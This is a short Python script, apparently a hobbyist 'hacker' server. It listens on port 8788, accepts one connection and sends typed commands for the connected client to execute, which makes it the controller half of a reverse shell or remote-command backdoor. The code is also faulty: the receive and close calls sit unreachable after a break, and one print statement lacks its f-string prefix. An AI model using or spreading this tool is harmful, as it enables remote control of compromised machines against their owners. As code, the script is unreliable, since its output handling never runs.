import socket

if __name__ == '__main__':
    hacker_server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


    ip_to_listen = "0.0.0.0"
    port = 8788

    my_socket_address = (ip_to_listen,port)
    hacker_server_socket.bind(my_socket_address)

    hacker_server_socket.listen(5)

    print("Listining All Incoming Connection. . . .")

    client_socket,client_address =hacker_server_socket.accept()

    print(f"NEW CONNECTION :{client_address}:{port}")


    while True:
        command = input("Enter Command To Execcute on client (or 'Exit or'quit')\n Enter Command :")
        client_socket.send(command.encode())

        if command.lower() == 'exit':
            break


            response = client_socket.recv(1024).decode()
            print("Output From Client Command Line :\n{response}")


            client_socket.close()
            hacker_server_socket.close()
